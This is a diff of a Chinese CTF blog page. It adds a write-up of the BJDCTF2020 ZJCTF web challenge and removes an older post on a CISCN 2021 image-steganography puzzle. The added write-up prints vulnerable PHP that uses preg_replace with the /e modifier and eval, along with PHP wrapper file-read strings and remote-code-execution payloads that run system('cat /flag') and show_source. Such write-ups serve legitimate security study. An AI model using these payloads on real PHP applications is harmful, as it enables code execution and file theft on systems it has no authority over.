@@ -71,6 +71,87 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-61" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/08/page-61/" class="article-date">
+  <time class="dt-published" datetime="2021-07-08T06:52:01.000Z" itemprop="datePublished">2021-07-08</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/08/page-61/">BJDCTF2020ZJCTF，不过如此  1</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>先用php伪协议 读取next.php  获得的代码<br>text=data://text/plain;base64,aWhhdmVhZHJlYW0=(文本内容ihaveadream的base64)&amp;file=php://filter/read=convert.base64-encode/resource=next.php</p>
+<p>base64解码一下得到如下</p>
+<?php
+$id = $_GET['id'];
+$_SESSION['id'] = $id;
+
+function complex($re, $str) {
+    return preg_replace(
+        '/(' . $re . ')/ei',
+        'strtolower("\\1")',
+        $str
+    );
+}
+
+
+foreach($_GET as $re => $str) {
+    echo complex($re, $str). "\n";
+}
+
+function getFlag(){
+    @eval($_GET['cmd']);
+}
+**考preg_replace()的RCE**
+https://xz.aliyun.com/t/2557
+这篇文章就是讲这个的利用的
+\S*()={${eval($_POST[a])}}
+a=system%28%27cat+%2Fflag%27%29%3B
+preg_replace()的RCE
+payload 为：
+
+ /?.*={${phpinfo()}}，
+
+
+即 GET 方式传入的参数名为 /?.* ，值为 {${phpinfo()}}
+
+payload2:
+
+\S*=${phpinfo()}
+payload:利用源码给的getFlag函数
+
+/next.php?\S*=${getflag()}&cmd=show_source(%22/flag%22);   在next.php下可以执行这个操作
+                                                    system('cat/flag');  这个不知道为什么不行看有的wp可以成功
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/08/page-61/" data-id="cksyl7wjq001gw4w7h8hkaumn" data-title="BJDCTF2020ZJCTF，不过如此  1" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-59" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/08/page-59/" class="article-date">
@@ -621,55 +702,6 @@ if(isset($_GET['exp'])){       ；典型的木马get方式
 
 
   
-    <article id="post-aaa" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/05/26/aaa/" class="article-date">
-  <time class="dt-published" datetime="2021-05-26T13:47:03.000Z" itemprop="datePublished">2021-05-26</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/05/26/aaa/">那啥ciscn2021杂项的running pixel</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>奔跑的像素点蛤？</p>
-<p>跑？ 把所有的帧给提取出来</p>
-<p>丢Stegsolve 里头看了看 red plane3 看了看 都有一个点比较另类的<img src="%5Caaa%5Caaa.jpg" alt="aaa"></p>
-<p><img src="%5Caaa%5Cccc.jpg" alt="ccc"></p>
-<p>然后ps看这个点的像素值总会含有这个RGB: 233,233,233的像素块  部分像素颜色为233，233，233将颜色为233，233，233区块的位置尝试画出来 </p>
-<p><img src="%5Caaa%5Cddd.jpg" alt="ddd"></p>
-<p>from PIL import Image</p>
-<p>flag_img = Image.new(‘1’,(400,400))<br>#mode=1 1位黑白像素，每字节存储一个像素<br>for name in range(10,383):    #这边应给得从1开始<br>    framepic = Image.open(‘0_f’+str(name)+’.gif’)   #然后这边0_f0 应该为这样 跑完前十张图后改称这样<br>    framepic = framepic.convert(“RGB”)<br>    width,height = framepic.size<br>    for w in range(width):<br>        for h in range(height):<br>            if framepic.getpixel((w,h)) == (233,233,233):<br>                flag_img.putpixel((h,w),1)</p>
-<p>flag_img.save(‘./flag/‘+str(name)+’.png’)</p>
-<p>和刚才的所有的帧数放在同一个文件夹 跑完程序就可以了  <img src="%5Caaa%5Cbbb.jpg" alt="bbb"></p>
-<p>慢慢拼图就能拿到flag了</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/05/26/aaa/" data-id="cksyl7wis0001w4w7cmdh41pf" data-title="那啥ciscn2021杂项的running pixel" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -706,6 +738,10 @@ if(isset($_GET['exp'])){       ；典型的木马get方式
       <ul>
         
           <li>
+            <a href="/2021/09/19/page-116/">第五空间WEBFTP pklovecloud</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/09/page-115/">又是misc</a>
           </li>
         
@@ -719,10 +755,6 @@ if(isset($_GET['exp'])){       ；典型的木马get方式
         
           <li>
             <a href="/2021/08/13/page-109/">网鼎杯 2020 白虎组PicDown</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
           </li>
         
       </ul>
